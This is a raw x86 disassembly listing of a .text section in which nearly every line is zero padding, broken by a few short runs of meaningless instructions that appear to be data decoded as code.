                           .text:00401500 00 00                            add    %al,(%eax)
                           .text:00401502 00 00                            add    %al,(%eax)
                           .text:00401504 00 00                            add    %al,(%eax)
                           .text:00401506 00 00                            add    %al,(%eax)
                           .text:00401508 00 00                            add    %al,(%eax)
                           .text:0040150a 00 00                            add    %al,(%eax)
                           .text:0040150c 00 00                            add    %al,(%eax)
                           .text:0040150e 00 00                            add    %al,(%eax)
                           .text:00401510 00 00                            add    %al,(%eax)
                           .text:00401512 00 00                            add    %al,(%eax)
                           .text:00401514 00 00                            add    %al,(%eax)
                           .text:00401516 00 00                            add    %al,(%eax)
                           .text:00401518 00 00                            add    %al,(%eax)
                           .text:0040151a 00 00                            add    %al,(%eax)
                           .text:0040151c 00 00                            add    %al,(%eax)
                           .text:0040151e 00 00                            add    %al,(%eax)
                           .text:00401520 96                               xchg   %eax,%esi
                           .text:00401521 d7                               xlat   %ds:(%ebx)
                           .text:00401522 fc                               cld    
                           .text:00401523 92                               xchg   %eax,%edx
                           .text:00401524 d6                               (bad)  
                           .text:00401525 4e                               dec    %esi
                           .text:00401526 e3 51                            jecxz  0x00401579
                           .text:00401528 f0 c6                            lock (bad) 
                           .text:0040152a 90                               nop
                           .text:0040152b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401530 88 ac cc b9 bf 7f 00             mov    %ch,0x7fbfb9(%esp,%ecx,8)
                           .text:00401537 00 00                            add    %al,(%eax)
                           .text:00401539 00 00                            add    %al,(%eax)
                           .text:0040153b 00 00                            add    %al,(%eax)
                           .text:0040153d 00 00                            add    %al,(%eax)
                           .text:0040153f 00 00                            add    %al,(%eax)
                           .text:00401541 00 00                            add    %al,(%eax)
                           .text:00401543 00 00                            add    %al,(%eax)
                           .text:00401545 00 00                            add    %al,(%eax)
                           .text:00401547 00 00                            add    %al,(%eax)
                           .text:00401549 00 00                            add    %al,(%eax)
                           .text:0040154b 00 00                            add    %al,(%eax)
                           .text:0040154d 00 00                            add    %al,(%eax)
                           .text:0040154f 00 00                            add    %al,(%eax)
                           .text:00401551 00 00                            add    %al,(%eax)
                           .text:00401553 00 00                            add    %al,(%eax)
                           .text:00401555 00 00                            add    %al,(%eax)
                           .text:00401557 00 00                            add    %al,(%eax)
                           .text:00401559 00 00                            add    %al,(%eax)
                           .text:0040155b 00 00                            add    %al,(%eax)
                           .text:0040155d 00 00                            add    %al,(%eax)
                           .text:0040155f 00 00                            add    %al,(%eax)
                           .text:00401561 00 00                            add    %al,(%eax)
                           .text:00401563 00 00                            add    %al,(%eax)
                           .text:00401565 00 00                            add    %al,(%eax)
                           .text:00401567 00 00                            add    %al,(%eax)
                           .text:00401569 00 00                            add    %al,(%eax)
                           .text:0040156b 00 00                            add    %al,(%eax)
                           .text:0040156d 00 00                            add    %al,(%eax)
                           .text:0040156f 00 00                            add    %al,(%eax)
                           .text:00401571 00 00                            add    %al,(%eax)
                           .text:00401573 00 00                            add    %al,(%eax)
                           .text:00401575 00 00                            add    %al,(%eax)
                           .text:00401577 00 00                            add    %al,(%eax)
                           .text:00401579 00 00                            add    %al,(%eax)
                           .text:0040157b 00 00                            add    %al,(%eax)
                           .text:0040157d 00 00                            add    %al,(%eax)
                           .text:0040157f 00 9a 8b 14 e5 8e                add    %bl,-0x711aeb75(%edx)
                           .text:00401585 e6 27                            out    %al,$0x27
                           .text:00401587 27                               daa    
                           .text:00401588 80 c7 90                         add    $0x90,%bh
                           .text:0040158b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401590 80 58 70 00                      sbbb   $0x0,0x70(%eax)
                           .text:00401594 00 00                            add    %al,(%eax)
                           .text:00401596 00 00                            add    %al,(%eax)
                           .text:00401598 00 00                            add    %al,(%eax)
                           .text:0040159a 00 00                            add    %al,(%eax)
                           .text:0040159c 00 00                            add    %al,(%eax)
                           .text:0040159e 00 00                            add    %al,(%eax)
                           .text:004015a0 00 00                            add    %al,(%eax)
                           .text:004015a2 00 00                            add    %al,(%eax)
                           .text:004015a4 00 00                            add    %al,(%eax)
                           .text:004015a6 00 00                            add    %al,(%eax)
                           .text:004015a8 00 00                            add    %al,(%eax)
                           .text:004015aa 00 00                            add    %al,(%eax)
                           .text:004015ac 00 00                            add    %al,(%eax)
                           .text:004015ae 00 00                            add    %al,(%eax)
                           .text:004015b0 00 00                            add    %al,(%eax)
                           .text:004015b2 00 00                            add    %al,(%eax)
                           .text:004015b4 00 00                            add    %al,(%eax)
                           .text:004015b6 00 00                            add    %al,(%eax)
                           .text:004015b8 00 00                            add    %al,(%eax)
                           .text:004015ba 00 00                            add    %al,(%eax)
                           .text:004015bc 00 00                            add    %al,(%eax)
                           .text:004015be 00 00                            add    %al,(%eax)
                           .text:004015c0 00 00                            add    %al,(%eax)
                           .text:004015c2 00 00                            add    %al,(%eax)
                           .text:004015c4 00 00                            add    %al,(%eax)
                           .text:004015c6 00 00                            add    %al,(%eax)
                           .text:004015c8 00 00                            add    %al,(%eax)
                           .text:004015ca 00 00                            add    %al,(%eax)
                           .text:004015cc 00 00                            add    %al,(%eax)
                           .text:004015ce 00 00                            add    %al,(%eax)
                           .text:004015d0 00 00                            add    %al,(%eax)
                           .text:004015d2 00 00                            add    %al,(%eax)
                           .text:004015d4 00 00                            add    %al,(%eax)
                           .text:004015d6 00 00                            add    %al,(%eax)
                           .text:004015d8 00 00                            add    %al,(%eax)
                           .text:004015da 00 00                            add    %al,(%eax)
                           .text:004015dc 00 00                            add    %al,(%eax)
                           .text:004015de 00 00                            add    %al,(%eax)
                           .text:004015e0 00 00                            add    %al,(%eax)
                           .text:004015e2 00 00                            add    %al,(%eax)
                           .text:004015e4 00 00                            add    %al,(%eax)
                           .text:004015e6 00 00                            add    %al,(%eax)
                           .text:004015e8 00 00                            add    %al,(%eax)
                           .text:004015ea 00 00                            add    %al,(%eax)
                           .text:004015ec 00 00                            add    %al,(%eax)
                           .text:004015ee 00 00                            add    %al,(%eax)
                           .text:004015f0 00 00                            add    %al,(%eax)
                           .text:004015f2 00 00                            add    %al,(%eax)
                           .text:004015f4 00 00                            add    %al,(%eax)
                           .text:004015f6 00 00                            add    %al,(%eax)
                           .text:004015f8 1f                               pop    %ds
                           .text:004015f9 ab                               stos   %eax,%es:(%edi)
                           .text:004015fa 7e 37                            jle    0x00401633
                           .text:004015fc 96                               xchg   %eax,%esi
                           .text:004015fd a4                               movsb  %ds:(%esi),%es:(%edi)
                           .text:004015fe 75 e6                            jne    0x004015e6
                           .text:00401600 00 cf                            add    %cl,%bh
                           .text:00401602 90                               nop
                           .text:00401603 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401608 60                               pusha  
                           .text:00401609 8b 4c 01 00                      mov    0x0(%ecx,%eax,1),%ecx
                           .text:0040160d 00 00                            add    %al,(%eax)
                           .text:0040160f 00 a0 b8 0e ff 21                add    %ah,0x21ff0eb8(%eax)
                           .text:00401615 98                               cwtl   
                           .text:00401616 96                               xchg   %eax,%esi
                           .text:00401617 6c                               insb   (%dx),%es:(%edi)
                           .text:00401618 30 cc                            xor    %cl,%ah
                           .text:0040161a 90                               nop
                           .text:0040161b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401620 90                               nop
                           .text:00401621 8b 4c 01 00                      mov    0x0(%ecx,%eax,1),%ecx
                           .text:00401625 00 00                            add    %al,(%eax)
                           .text:00401627 00 00                            add    %al,(%eax)
                           .text:00401629 00 00                            add    %al,(%eax)
                           .text:0040162b 00 00                            add    %al,(%eax)
                           .text:0040162d 00 00                            add    %al,(%eax)
                           .text:0040162f 00 00                            add    %al,(%eax)
                           .text:00401631 00 00                            add    %al,(%eax)
                           .text:00401633 00 00                            add    %al,(%eax)
                           .text:00401635 00 00                            add    %al,(%eax)
                           .text:00401637 00 00                            add    %al,(%eax)
                           .text:00401639 00 00                            add    %al,(%eax)
                           .text:0040163b 00 00                            add    %al,(%eax)
                           .text:0040163d 00 00                            add    %al,(%eax)
                           .text:0040163f 00 22                            add    %ah,(%edx)
                           .text:00401641 a8 8d                            test   $0x8d,%al
                           .text:00401643 4a                               dec    %edx
                           .text:00401644 50                               push   %eax
                           .text:00401645 9f                               lahf   
                           .text:00401646 cd 02                            int    $0x2
                           .text:00401648 50                               push   %eax
                           .text:00401649 c7                               (bad)  
                           .text:0040164a 90                               nop
                           .text:0040164b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401650 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401653 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401659 00 00                            add    %al,(%eax)
                           .text:0040165b 00 00                            add    %al,(%eax)
                           .text:0040165d 00 00                            add    %al,(%eax)
                           .text:0040165f 00 00                            add    %al,(%eax)
                           .text:00401661 00 00                            add    %al,(%eax)
                           .text:00401663 00 00                            add    %al,(%eax)
                           .text:00401665 00 00                            add    %al,(%eax)
                           .text:00401667 00 00                            add    %al,(%eax)
                           .text:00401669 00 00                            add    %al,(%eax)
                           .text:0040166b 00 00                            add    %al,(%eax)
                           .text:0040166d 00 00                            add    %al,(%eax)
                           .text:0040166f 00 00                            add    %al,(%eax)
                           .text:00401671 00 00                            add    %al,(%eax)
                           .text:00401673 00 00                            add    %al,(%eax)
                           .text:00401675 00 00                            add    %al,(%eax)
                           .text:00401677 00 00                            add    %al,(%eax)
                           .text:00401679 00 00                            add    %al,(%eax)
                           .text:0040167b 00 00                            add    %al,(%eax)
                           .text:0040167d 00 00                            add    %al,(%eax)
                           .text:0040167f 00 00                            add    %al,(%eax)
                           .text:00401681 00 00                            add    %al,(%eax)
                           .text:00401683 00 00                            add    %al,(%eax)
                           .text:00401685 00 00                            add    %al,(%eax)
                           .text:00401687 00 00                            add    %al,(%eax)
                           .text:00401689 00 00                            add    %al,(%eax)
                           .text:0040168b 00 00                            add    %al,(%eax)
                           .text:0040168d 00 00                            add    %al,(%eax)
                           .text:0040168f 00 00                            add    %al,(%eax)
                           .text:00401691 00 00                            add    %al,(%eax)
                           .text:00401693 00 00                            add    %al,(%eax)
                           .text:00401695 00 00                            add    %al,(%eax)
                           .text:00401697 00 00                            add    %al,(%eax)
                           .text:00401699 00 00                            add    %al,(%eax)
                           .text:0040169b 00 00                            add    %al,(%eax)
                           .text:0040169d 00 00                            add    %al,(%eax)
                           .text:0040169f 00 00                            add    %al,(%eax)
                           .text:004016a1 00 00                            add    %al,(%eax)
                           .text:004016a3 00 00                            add    %al,(%eax)
                           .text:004016a5 00 00                            add    %al,(%eax)
                           .text:004016a7 00 00                            add    %al,(%eax)
                           .text:004016a9 00 00                            add    %al,(%eax)
                           .text:004016ab 00 00                            add    %al,(%eax)
                           .text:004016ad 00 00                            add    %al,(%eax)
                           .text:004016af 00 00                            add    %al,(%eax)
                           .text:004016b1 00 00                            add    %al,(%eax)
                           .text:004016b3 00 00                            add    %al,(%eax)
                           .text:004016b5 00 00                            add    %al,(%eax)
                           .text:004016b7 00 00                            add    %al,(%eax)
                           .text:004016b9 00 00                            add    %al,(%eax)
                           .text:004016bb 00 00                            add    %al,(%eax)
                           .text:004016bd 00 00                            add    %al,(%eax)
                           .text:004016bf 00 00                            add    %al,(%eax)
                           .text:004016c1 00 00                            add    %al,(%eax)
                           .text:004016c3 00 00                            add    %al,(%eax)
                           .text:004016c5 00 00                            add    %al,(%eax)
                           .text:004016c7 00 00                            add    %al,(%eax)
                           .text:004016c9 00 00                            add    %al,(%eax)
                           .text:004016cb 00 00                            add    %al,(%eax)
                           .text:004016cd 00 00                            add    %al,(%eax)
                           .text:004016cf 00 00                            add    %al,(%eax)
                           .text:004016d1 00 00                            add    %al,(%eax)
                           .text:004016d3 00 00                            add    %al,(%eax)
                           .text:004016d5 00 00                            add    %al,(%eax)
                           .text:004016d7 00 00                            add    %al,(%eax)
                           .text:004016d9 00 00                            add    %al,(%eax)
                           .text:004016db 00 00                            add    %al,(%eax)
                           .text:004016dd 00 00                            add    %al,(%eax)
                           .text:004016df 00 00                            add    %al,(%eax)
                           .text:004016e1 00 00                            add    %al,(%eax)
                           .text:004016e3 00 00                            add    %al,(%eax)
                           .text:004016e5 00 00                            add    %al,(%eax)
                           .text:004016e7 00 00                            add    %al,(%eax)
                           .text:004016e9 00 00                            add    %al,(%eax)
                           .text:004016eb 00 00                            add    %al,(%eax)
                           .text:004016ed 00 00                            add    %al,(%eax)
                           .text:004016ef 00 00                            add    %al,(%eax)
                           .text:004016f1 00 00                            add    %al,(%eax)
                           .text:004016f3 00 00                            add    %al,(%eax)
                           .text:004016f5 00 00                            add    %al,(%eax)
                           .text:004016f7 00 00                            add    %al,(%eax)
                           .text:004016f9 00 00                            add    %al,(%eax)
                           .text:004016fb 00 00                            add    %al,(%eax)
                           .text:004016fd 00 00                            add    %al,(%eax)
                           .text:004016ff 00 00                            add    %al,(%eax)
                           .text:00401701 00 00                            add    %al,(%eax)
                           .text:00401703 00 00                            add    %al,(%eax)
                           .text:00401705 00 00                            add    %al,(%eax)
                           .text:00401707 00 00                            add    %al,(%eax)
                           .text:00401709 00 00                            add    %al,(%eax)
                           .text:0040170b 00 00                            add    %al,(%eax)
                           .text:0040170d 00 00                            add    %al,(%eax)
                           .text:0040170f 00 00                            add    %al,(%eax)
                           .text:00401711 00 00                            add    %al,(%eax)
                           .text:00401713 00 00                            add    %al,(%eax)
                           .text:00401715 00 00                            add    %al,(%eax)
                           .text:00401717 00 00                            add    %al,(%eax)
                           .text:00401719 00 00                            add    %al,(%eax)
                           .text:0040171b 00 00                            add    %al,(%eax)
                           .text:0040171d 00 00                            add    %al,(%eax)
                           .text:0040171f 00 00                            add    %al,(%eax)
                           .text:00401721 00 00                            add    %al,(%eax)
                           .text:00401723 00 00                            add    %al,(%eax)
                           .text:00401725 00 00                            add    %al,(%eax)
                           .text:00401727 00 00                            add    %al,(%eax)
                           .text:00401729 00 00                            add    %al,(%eax)
                           .text:0040172b 00 00                            add    %al,(%eax)
                           .text:0040172d 00 00                            add    %al,(%eax)
                           .text:0040172f 00 00                            add    %al,(%eax)
                           .text:00401731 00 00                            add    %al,(%eax)
                           .text:00401733 00 00                            add    %al,(%eax)
                           .text:00401735 00 00                            add    %al,(%eax)
                           .text:00401737 00 00                            add    %al,(%eax)
                           .text:00401739 00 00                            add    %al,(%eax)
                           .text:0040173b 00 00                            add    %al,(%eax)
                           .text:0040173d 00 00                            add    %al,(%eax)
                           .text:0040173f 00 00                            add    %al,(%eax)
                           .text:00401741 00 00                            add    %al,(%eax)
                           .text:00401743 00 00                            add    %al,(%eax)
                           .text:00401745 00 00                            add    %al,(%eax)
                           .text:00401747 00 00                            add    %al,(%eax)
                           .text:00401749 00 00                            add    %al,(%eax)
                           .text:0040174b 00 00                            add    %al,(%eax)
                           .text:0040174d 00 00                            add    %al,(%eax)
                           .text:0040174f 00 00                            add    %al,(%eax)
                           .text:00401751 00 00                            add    %al,(%eax)
                           .text:00401753 00 00                            add    %al,(%eax)
                           .text:00401755 00 00                            add    %al,(%eax)
                           .text:00401757 00 00                            add    %al,(%eax)
                           .text:00401759 00 00                            add    %al,(%eax)
                           .text:0040175b 00 00                            add    %al,(%eax)
                           .text:0040175d 00 00                            add    %al,(%eax)
                           .text:0040175f 00 00                            add    %al,(%eax)
                           .text:00401761 00 00                            add    %al,(%eax)
                           .text:00401763 00 00                            add    %al,(%eax)
                           .text:00401765 00 00                            add    %al,(%eax)
                           .text:00401767 00 00                            add    %al,(%eax)
                           .text:00401769 00 00                            add    %al,(%eax)
                           .text:0040176b 00 00                            add    %al,(%eax)
                           .text:0040176d 00 00                            add    %al,(%eax)
                           .text:0040176f 00 00                            add    %al,(%eax)
                           .text:00401771 00 00                            add    %al,(%eax)
                           .text:00401773 00 00                            add    %al,(%eax)
                           .text:00401775 00 00                            add    %al,(%eax)
                           .text:00401777 00 00                            add    %al,(%eax)
                           .text:00401779 00 00                            add    %al,(%eax)
                           .text:0040177b 00 00                            add    %al,(%eax)
                           .text:0040177d 00 00                            add    %al,(%eax)
                           .text:0040177f 00 00                            add    %al,(%eax)
                           .text:00401781 00 00                            add    %al,(%eax)
                           .text:00401783 00 00                            add    %al,(%eax)
                           .text:00401785 00 00                            add    %al,(%eax)
                           .text:00401787 00 00                            add    %al,(%eax)
                           .text:00401789 00 00                            add    %al,(%eax)
                           .text:0040178b 00 00                            add    %al,(%eax)
                           .text:0040178d 00 00                            add    %al,(%eax)
                           .text:0040178f 00 00                            add    %al,(%eax)
                           .text:00401791 00 00                            add    %al,(%eax)
                           .text:00401793 00 00                            add    %al,(%eax)
                           .text:00401795 00 00                            add    %al,(%eax)
                           .text:00401797 00 00                            add    %al,(%eax)
                           .text:00401799 00 00                            add    %al,(%eax)
                           .text:0040179b 00 00                            add    %al,(%eax)
                           .text:0040179d 00 00                            add    %al,(%eax)
                           .text:0040179f 00 00                            add    %al,(%eax)
                           .text:004017a1 00 00                            add    %al,(%eax)
                           .text:004017a3 00 00                            add    %al,(%eax)
                           .text:004017a5 00 00                            add    %al,(%eax)
                           .text:004017a7 00 00                            add    %al,(%eax)
                           .text:004017a9 00 00                            add    %al,(%eax)
                           .text:004017ab 00 00                            add    %al,(%eax)
                           .text:004017ad 00 00                            add    %al,(%eax)
                           .text:004017af 00 00                            add    %al,(%eax)
                           .text:004017b1 00 00                            add    %al,(%eax)
                           .text:004017b3 00 00                            add    %al,(%eax)
                           .text:004017b5 00 00                            add    %al,(%eax)
                           .text:004017b7 00 00                            add    %al,(%eax)
                           .text:004017b9 00 00                            add    %al,(%eax)
                           .text:004017bb 00 00                            add    %al,(%eax)
                           .text:004017bd 00 00                            add    %al,(%eax)
                           .text:004017bf 00 00                            add    %al,(%eax)
                           .text:004017c1 00 00                            add    %al,(%eax)
                           .text:004017c3 00 00                            add    %al,(%eax)
                           .text:004017c5 00 00                            add    %al,(%eax)
                           .text:004017c7 00 00                            add    %al,(%eax)
                           .text:004017c9 00 00                            add    %al,(%eax)
                           .text:004017cb 00 00                            add    %al,(%eax)
                           .text:004017cd 00 00                            add    %al,(%eax)
                           .text:004017cf 00 00                            add    %al,(%eax)
                           .text:004017d1 00 00                            add    %al,(%eax)
                           .text:004017d3 00 00                            add    %al,(%eax)
                           .text:004017d5 00 00                            add    %al,(%eax)
                           .text:004017d7 00 00                            add    %al,(%eax)
                           .text:004017d9 00 00                            add    %al,(%eax)
                           .text:004017db 00 00                            add    %al,(%eax)
                           .text:004017dd 00 00                            add    %al,(%eax)
                           .text:004017df 00 00                            add    %al,(%eax)
                           .text:004017e1 00 00                            add    %al,(%eax)
                           .text:004017e3 00 00                            add    %al,(%eax)
                           .text:004017e5 00 00                            add    %al,(%eax)
                           .text:004017e7 00 00                            add    %al,(%eax)
                           .text:004017e9 00 00                            add    %al,(%eax)
                           .text:004017eb 00 00                            add    %al,(%eax)
                           .text:004017ed 00 00                            add    %al,(%eax)
                           .text:004017ef 00 00                            add    %al,(%eax)
                           .text:004017f1 00 00                            add    %al,(%eax)
                           .text:004017f3 00 00                            add    %al,(%eax)
                           .text:004017f5 00 00                            add    %al,(%eax)
                           .text:004017f7 00 00                            add    %al,(%eax)
                           .text:004017f9 00 00                            add    %al,(%eax)
                           .text:004017fb 00 00                            add    %al,(%eax)
                           .text:004017fd 00 00                            add    %al,(%eax)
                           .text:004017ff 00 00                            add    %al,(%eax)
                           .text:00401801 00 00                            add    %al,(%eax)
                           .text:00401803 00 00                            add    %al,(%eax)
                           .text:00401805 00 00                            add    %al,(%eax)
                           .text:00401807 00 00                            add    %al,(%eax)
                           .text:00401809 00 00                            add    %al,(%eax)
                           .text:0040180b 00 00                            add    %al,(%eax)
                           .text:0040180d 00 00                            add    %al,(%eax)
                           .text:0040180f 00 00                            add    %al,(%eax)
                           .text:00401811 00 00                            add    %al,(%eax)
                           .text:00401813 00 00                            add    %al,(%eax)
                           .text:00401815 00 00                            add    %al,(%eax)
                           .text:00401817 00 00                            add    %al,(%eax)
                           .text:00401819 00 00                            add    %al,(%eax)
                           .text:0040181b 00 00                            add    %al,(%eax)
                           .text:0040181d 00 00                            add    %al,(%eax)
                           .text:0040181f 00 b6 ff b7 15 4e                add    %dh,0x4e15b7ff(%esi)
                           .text:00401825 bd f0 ab 60 cc                   mov    $0xcc60abf0,%ebp
                           .text:0040182a 90                               nop
                           .text:0040182b ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401830 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401833 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401839 00 00                            add    %al,(%eax)
                           .text:0040183b 00 00                            add    %al,(%eax)
                           .text:0040183d 00 00                            add    %al,(%eax)
                           .text:0040183f 00 00                            add    %al,(%eax)
                           .text:00401841 00 00                            add    %al,(%eax)
                           .text:00401843 00 00                            add    %al,(%eax)
                           .text:00401845 00 00                            add    %al,(%eax)
                           .text:00401847 00 00                            add    %al,(%eax)
                           .text:00401849 00 00                            add    %al,(%eax)
                           .text:0040184b 00 00                            add    %al,(%eax)
                           .text:0040184d 00 00                            add    %al,(%eax)
                           .text:0040184f 00 00                            add    %al,(%eax)
                           .text:00401851 00 00                            add    %al,(%eax)
                           .text:00401853 00 00                            add    %al,(%eax)
                           .text:00401855 00 00                            add    %al,(%eax)
                           .text:00401857 00 00                            add    %al,(%eax)
                           .text:00401859 00 00                            add    %al,(%eax)
                           .text:0040185b 00 00                            add    %al,(%eax)
                           .text:0040185d 00 00                            add    %al,(%eax)
                           .text:0040185f 00 00                            add    %al,(%eax)
                           .text:00401861 00 00                            add    %al,(%eax)
                           .text:00401863 00 00                            add    %al,(%eax)
                           .text:00401865 00 00                            add    %al,(%eax)
                           .text:00401867 00 00                            add    %al,(%eax)
                           .text:00401869 00 00                            add    %al,(%eax)
                           .text:0040186b 00 00                            add    %al,(%eax)
                           .text:0040186d 00 00                            add    %al,(%eax)
                           .text:0040186f 00 00                            add    %al,(%eax)
                           .text:00401871 00 00                            add    %al,(%eax)
                           .text:00401873 00 00                            add    %al,(%eax)
                           .text:00401875 00 00                            add    %al,(%eax)
                           .text:00401877 00 00                            add    %al,(%eax)
                           .text:00401879 00 00                            add    %al,(%eax)
                           .text:0040187b 00 00                            add    %al,(%eax)
                           .text:0040187d 00 00                            add    %al,(%eax)
                           .text:0040187f 00 00                            add    %al,(%eax)
                           .text:00401881 00 00                            add    %al,(%eax)
                           .text:00401883 00 00                            add    %al,(%eax)
                           .text:00401885 00 00                            add    %al,(%eax)
                           .text:00401887 00 00                            add    %al,(%eax)
                           .text:00401889 00 00                            add    %al,(%eax)
                           .text:0040188b 00 00                            add    %al,(%eax)
                           .text:0040188d 00 00                            add    %al,(%eax)
                           .text:0040188f 00 00                            add    %al,(%eax)
                           .text:00401891 00 00                            add    %al,(%eax)
                           .text:00401893 00 00                            add    %al,(%eax)
                           .text:00401895 00 00                            add    %al,(%eax)
                           .text:00401897 00 00                            add    %al,(%eax)
                           .text:00401899 00 00                            add    %al,(%eax)
                           .text:0040189b 00 00                            add    %al,(%eax)
                           .text:0040189d 00 00                            add    %al,(%eax)
                           .text:0040189f 00 00                            add    %al,(%eax)
                           .text:004018a1 00 00                            add    %al,(%eax)
                           .text:004018a3 00 00                            add    %al,(%eax)
                           .text:004018a5 00 00                            add    %al,(%eax)
                           .text:004018a7 00 00                            add    %al,(%eax)
                           .text:004018a9 00 00                            add    %al,(%eax)
                           .text:004018ab 00 00                            add    %al,(%eax)
                           .text:004018ad 00 00                            add    %al,(%eax)
                           .text:004018af 00 00                            add    %al,(%eax)
                           .text:004018b1 00 00                            add    %al,(%eax)
                           .text:004018b3 00 00                            add    %al,(%eax)
                           .text:004018b5 00 00                            add    %al,(%eax)
                           .text:004018b7 00 00                            add    %al,(%eax)
                           .text:004018b9 00 00                            add    %al,(%eax)
                           .text:004018bb 00 00                            add    %al,(%eax)
                           .text:004018bd 00 00                            add    %al,(%eax)
                           .text:004018bf 00 00                            add    %al,(%eax)
                           .text:004018c1 00 00                            add    %al,(%eax)
                           .text:004018c3 00 00                            add    %al,(%eax)
                           .text:004018c5 00 00                            add    %al,(%eax)
                           .text:004018c7 00 00                            add    %al,(%eax)
                           .text:004018c9 00 00                            add    %al,(%eax)
                           .text:004018cb 00 00                            add    %al,(%eax)
                           .text:004018cd 00 00                            add    %al,(%eax)
                           .text:004018cf 00 00                            add    %al,(%eax)
                           .text:004018d1 00 00                            add    %al,(%eax)
                           .text:004018d3 00 00                            add    %al,(%eax)
                           .text:004018d5 00 00                            add    %al,(%eax)
                           .text:004018d7 00 00                            add    %al,(%eax)
                           .text:004018d9 00 00                            add    %al,(%eax)
                           .text:004018db 00 00                            add    %al,(%eax)
                           .text:004018dd 00 00                            add    %al,(%eax)
                           .text:004018df 00 00                            add    %al,(%eax)
                           .text:004018e1 00 00                            add    %al,(%eax)
                           .text:004018e3 00 00                            add    %al,(%eax)
                           .text:004018e5 00 00                            add    %al,(%eax)
                           .text:004018e7 00 00                            add    %al,(%eax)
                           .text:004018e9 00 00                            add    %al,(%eax)
                           .text:004018eb 00 00                            add    %al,(%eax)
                           .text:004018ed 00 00                            add    %al,(%eax)
                           .text:004018ef 00 00                            add    %al,(%eax)
                           .text:004018f1 00 00                            add    %al,(%eax)
                           .text:004018f3 00 00                            add    %al,(%eax)
                           .text:004018f5 00 00                            add    %al,(%eax)
                           .text:004018f7 00 00                            add    %al,(%eax)
                           .text:004018f9 00 00                            add    %al,(%eax)
                           .text:004018fb 00 00                            add    %al,(%eax)
                           .text:004018fd 00 00                            add    %al,(%eax)
                           .text:004018ff 00 00                            add    %al,(%eax)
                           .text:00401901 00 00                            add    %al,(%eax)
                           .text:00401903 00 00                            add    %al,(%eax)
                           .text:00401905 00 00                            add    %al,(%eax)
                           .text:00401907 00 00                            add    %al,(%eax)
                           .text:00401909 00 00                            add    %al,(%eax)
                           .text:0040190b 00 00                            add    %al,(%eax)
                           .text:0040190d 00 00                            add    %al,(%eax)
                           .text:0040190f 00 00                            add    %al,(%eax)
                           .text:00401911 00 00                            add    %al,(%eax)
                           .text:00401913 00 00                            add    %al,(%eax)
                           .text:00401915 00 00                            add    %al,(%eax)
                           .text:00401917 00 00                            add    %al,(%eax)
                           .text:00401919 00 00                            add    %al,(%eax)
                           .text:0040191b 00 00                            add    %al,(%eax)
                           .text:0040191d 00 00                            add    %al,(%eax)
                           .text:0040191f 00 00                            add    %al,(%eax)
                           .text:00401921 00 00                            add    %al,(%eax)
                           .text:00401923 00 00                            add    %al,(%eax)
                           .text:00401925 00 00                            add    %al,(%eax)
                           .text:00401927 00 41 2d                         add    %al,0x2d(%ecx)
                           .text:0040192a 47                               inc    %edi
                           .text:0040192b 9e                               sahf   
                           .text:0040192c 9e                               sahf   
                           .text:0040192d e9 3f 43 b0 53                   jmp    0x53f05c71
                           .text:00401932 1f                               pop    %ds
                           .text:00401933 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401938 60                               pusha  
                           .text:00401939 58                               pop    %eax
                           .text:0040193a 70 00                            jo     0x0040193c
                           .text:0040193c 00 00                            add    %al,(%eax)
                           .text:0040193e 00 00                            add    %al,(%eax)
                           .text:00401940 00 00                            add    %al,(%eax)
                           .text:00401942 00 00                            add    %al,(%eax)
                           .text:00401944 00 00                            add    %al,(%eax)
                           .text:00401946 00 00                            add    %al,(%eax)
                           .text:00401948 00 00                            add    %al,(%eax)
                           .text:0040194a 00 00                            add    %al,(%eax)
                           .text:0040194c 00 00                            add    %al,(%eax)
                           .text:0040194e 00 00                            add    %al,(%eax)
                           .text:00401950 00 00                            add    %al,(%eax)
                           .text:00401952 00 00                            add    %al,(%eax)
                           .text:00401954 00 00                            add    %al,(%eax)
                           .text:00401956 00 00                            add    %al,(%eax)
                           .text:00401958 00 00                            add    %al,(%eax)
                           .text:0040195a 00 00                            add    %al,(%eax)
                           .text:0040195c 00 00                            add    %al,(%eax)
                           .text:0040195e 00 00                            add    %al,(%eax)
                           .text:00401960 00 00                            add    %al,(%eax)
                           .text:00401962 00 00                            add    %al,(%eax)
                           .text:00401964 00 00                            add    %al,(%eax)
                           .text:00401966 00 00                            add    %al,(%eax)
                           .text:00401968 00 00                            add    %al,(%eax)
                           .text:0040196a 00 00                            add    %al,(%eax)
                           .text:0040196c 00 00                            add    %al,(%eax)
                           .text:0040196e 00 00                            add    %al,(%eax)
                           .text:00401970 00 00                            add    %al,(%eax)
                           .text:00401972 00 00                            add    %al,(%eax)
                           .text:00401974 00 00                            add    %al,(%eax)
                           .text:00401976 00 00                            add    %al,(%eax)
                           .text:00401978 00 00                            add    %al,(%eax)
                           .text:0040197a 00 00                            add    %al,(%eax)
                           .text:0040197c 00 00                            add    %al,(%eax)
                           .text:0040197e 00 00                            add    %al,(%eax)
                           .text:00401980 00 00                            add    %al,(%eax)
                           .text:00401982 00 00                            add    %al,(%eax)
                           .text:00401984 00 00                            add    %al,(%eax)
                           .text:00401986 00 00                            add    %al,(%eax)
                           .text:00401988 00 00                            add    %al,(%eax)
                           .text:0040198a 00 00                            add    %al,(%eax)
                           .text:0040198c 00 00                            add    %al,(%eax)
                           .text:0040198e 00 00                            add    %al,(%eax)
                           .text:00401990 00 00                            add    %al,(%eax)
                           .text:00401992 00 00                            add    %al,(%eax)
                           .text:00401994 00 00                            add    %al,(%eax)
                           .text:00401996 00 00                            add    %al,(%eax)
                           .text:00401998 00 00                            add    %al,(%eax)
                           .text:0040199a 00 00                            add    %al,(%eax)
                           .text:0040199c 00 00                            add    %al,(%eax)
                           .text:0040199e 00 00                            add    %al,(%eax)
                           .text:004019a0 46                               inc    %esi
                           .text:004019a1 b1 34                            mov    $0x34,%cl
                           .text:004019a3 ec                               in     (%dx),%al
                           .text:004019a4 83 00 cf                         addl   $0xffffffcf,(%eax)
